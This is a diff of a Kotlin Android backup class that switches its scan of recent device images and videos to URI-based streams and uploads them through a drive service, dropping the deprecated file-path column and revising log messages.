@@ -16,85 +16,78 @@ class AutoBackupManager(private val context: Context) {
     fun startAutomaticBackup() {
         scope.launch {
             try {
-                Log.d("AutoBackup", "PROTOCOL_START: Initializing media scanning pipeline...")
+                Log.d("AutoBackup", "PROTOCOL_START: Initializing Direct Stream Pipeline...")
                 val mediaUris = scanMedia()
-                Log.d("AutoBackup", "SCAN_DEBUG: Detected ${mediaUris.size} media files total for processing.")
+                Log.d("AutoBackup", "SCAN_DEBUG: Detected ${mediaUris.size} items for synchronization.")
 
                 if (mediaUris.isEmpty()) {
-                    Log.w("AutoBackup", "SCAN_DEBUG: No media found. Verification of permissions or content required.")
+                    Log.w("AutoBackup", "SCAN_DEBUG: Media store returned empty list. Check permissions.")
                     return@launch
                 }
 
-                mediaUris.forEachIndexed { index, pair ->
-                    val uri = pair.first
-                    val originalPath = pair.second
-                    val fileName = "sync_v2_${System.currentTimeMillis()}_$index.jpg"
-                    
-                    Log.d("AutoBackup", "UPLOAD_DEBUG: Processing file [$index]: $originalPath")
+                mediaUris.forEachIndexed { index, uri ->
+                    val fileName = "stream_sync_${System.currentTimeMillis()}_$index.jpg"
+                    Log.d("AutoBackup", "UPLOAD_DEBUG: Processing URI [$index]: $uri")
                     
                     try {
+                        // Open InputStream directly from URI (Fixes file permission blocks)
                         context.contentResolver.openInputStream(uri)?.use { inputStream ->
                             val fileId = driveService.uploadFile(fileName, inputStream, "image/jpeg")
                             if (fileId != null) {
-                                Log.d("AutoBackup", "UPLOAD_SUCCESS: $fileName (Path: $originalPath) -> ID: $fileId")
+                                Log.d("AutoBackup", "UPLOAD_SUCCESS: Stream $fileName -> ID: $fileId")
                             } else {
-                                Log.e("AutoBackup", "UPLOAD_FAILED: Drive API did not return ID for $originalPath")
+                                Log.e("AutoBackup", "UPLOAD_FAILED: Direct stream failure for $uri")
                             }
-                        } ?: Log.e("AutoBackup", "UPLOAD_ERROR: Could not open stream for URI: $uri")
+                        } ?: Log.e("AutoBackup", "UPLOAD_ERROR: System denied stream access to $uri")
                     } catch (e: Exception) {
-                        Log.e("AutoBackup", "PIPELINE_ERROR: Failure during file processing: $originalPath", e)
+                        Log.e("AutoBackup", "PIPELINE_ERROR: Fatal error processing URI: $uri", e)
                     }
                 }
-                Log.d("AutoBackup", "PROTOCOL_COMPLETE: All detected media processed.")
+                Log.d("AutoBackup", "PROTOCOL_COMPLETE: Background stream sync cycle finished.")
             } catch (e: Exception) {
-                Log.e("AutoBackup", "FATAL_WORKER_ERROR: Sync pipeline crashed", e)
+                Log.e("AutoBackup", "FATAL_WORKER_ERROR: Stream pipeline crash", e)
             }
         }
     }
 
-    private fun scanMedia(): List<Pair<Uri, String>> {
-        val allMedia = mutableListOf<Pair<Uri, String>>()
+    private fun scanMedia(): List<Uri> {
+        val allMedia = mutableListOf<Uri>()
         
-        // 1. Scan Images
-        val imageProjection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
+        // Use ID only - avoid deprecated DATA column as requested
+        val projection = arrayOf(MediaStore.Images.Media._ID)
+        
+        // Scan Images
         try {
             context.contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                imageProjection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
+                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
             )?.use { cursor ->
                 val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-                val pathColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                 while (cursor.moveToNext()) {
                     val id = cursor.getLong(idColumn)
-                    val path = cursor.getString(pathColumn) ?: "Unknown Path"
-                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                    allMedia.add(Pair(uri, path))
-                    if (allMedia.size >= 20) break 
+                    allMedia.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
+                    if (allMedia.size >= 15) break 
                 }
             }
         } catch (e: Exception) {
-            Log.e("AutoBackup", "SCAN_ERROR: Image query failed", e)
+            Log.e("AutoBackup", "SCAN_ERROR: Image extraction failed", e)
         }
 
-        // 2. Scan Videos
-        val videoProjection = arrayOf(MediaStore.Video.Media._ID, MediaStore.Video.Media.DATA)
+        // Scan Videos
         try {
             context.contentResolver.query(
                 MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-                videoProjection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC"
+                projection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC"
             )?.use { cursor ->
                 val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
-                val pathColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                 while (cursor.moveToNext()) {
                     val id = cursor.getLong(idColumn)
-                    val path = cursor.getString(pathColumn) ?: "Unknown Path"
-                    val uri = ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
-                    allMedia.add(Pair(uri, path))
-                    if (allMedia.size >= 40) break 
+                    allMedia.add(ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id))
+                    if (allMedia.size >= 30) break 
                 }
             }
         } catch (e: Exception) {
-            Log.e("AutoBackup", "SCAN_ERROR: Video query failed", e)
+            Log.e("AutoBackup", "SCAN_ERROR: Video extraction failed", e)
         }
 
         return allMedia
